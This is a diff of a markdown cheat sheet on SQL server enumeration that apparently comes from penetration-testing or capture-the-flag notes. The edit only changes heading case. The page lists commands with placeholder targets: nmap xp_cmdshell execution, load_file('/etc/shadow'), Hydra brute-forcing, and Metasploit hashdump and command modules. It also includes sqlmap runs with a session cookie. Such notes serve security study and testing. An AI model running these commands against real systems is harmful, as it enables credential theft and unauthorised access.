@@ -3,7 +3,9 @@ title = "SQL Enumeration"
 weight = 40
 +++
 
-### NMAP
+# SQL Enumeration
+
+### Nmap
 ```bash
 sudo nmap -p 3306 -sV -O <TARGET_IP>
 
@@ -37,7 +39,7 @@ nmap -p 3306 --script ms-sql-xp-cmdshell --script-args mssql.username=<USER>,mss
 nmap -p 3306 --script ms-sql-xp-cmdshell --script-args mssql.username=<USER>,mssql.password=<PW>,ms-sql-xp-cmdshell.cmd="type c:\flag.txt" <TARGET_IP>
 ```
 
-### MYSQL
+### MySQL
 ```bash
 mysql -h <TARGET_IP> -u <USER>
 mysql -h <TARGET_IP> -u root
@@ -50,12 +52,12 @@ select count(*) from <TABLE_NAME>;
 select load_file("/etc/shadow");
 ```
 
-### HYDRA
+### Hydra
 ```bash
 hydra -l <USER> -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <TARGET_IP> mysql
 ```
 
-### METASPLOIT
+### Metasploit
 ```bash
 use auxiliary/scanner/mysql/mysql_schemadump
 use auxiliary/scanner/mysql/mysql_writable_dirs
@@ -63,7 +65,7 @@ use auxiliary/scanner/mysql/mysql_file_enum
 use auxiliary/scanner/mysql/mysql_hashdump
 use auxiliary/scanner/mysql/mysql_login
 
-## MS Sql
+## MS SQL
 use auxiliary/scanner/mssql/mssql_login
 use auxiliary/admin/mssql/mssql_enum
 use auxiliary/admin/mssql/mssql_enum_sql_logins
@@ -94,7 +96,7 @@ set CMD whoami
 exploit
 ```
 
-### SQLMAP
+### SQL Map
 ```bash
 sqlmap -u "http://<TARGET_IP>/sqli_1.php?title=hacking&action=search" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title
 
